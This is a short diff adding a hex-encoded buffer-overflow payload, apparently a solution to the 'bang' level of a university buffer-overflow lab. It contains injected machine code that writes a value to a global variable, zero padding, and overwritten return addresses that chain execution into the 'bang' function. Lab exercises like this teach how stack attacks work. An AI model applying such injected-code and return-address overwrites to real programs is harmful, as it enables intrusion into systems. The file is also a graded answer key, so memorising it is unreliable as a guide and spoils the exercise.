@@ -1,0 +1,17 @@
+/* my function 13 Bytes */
+b8 68 18 e4 64 /* mov $0x64e41868,%eax */
+b9 0c d1 04 08 /* mov $0x0804d10c,%ecx */
+89 01          /* mov %eax,(%ecx) */
+c3             /* ret */
+
+/* spaces 31 Bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+
+/* return address to my function 4 Bytes */
+58 3b 68 55
+
+/* return address to bang 4 Bytes */
+52 8d 04 08
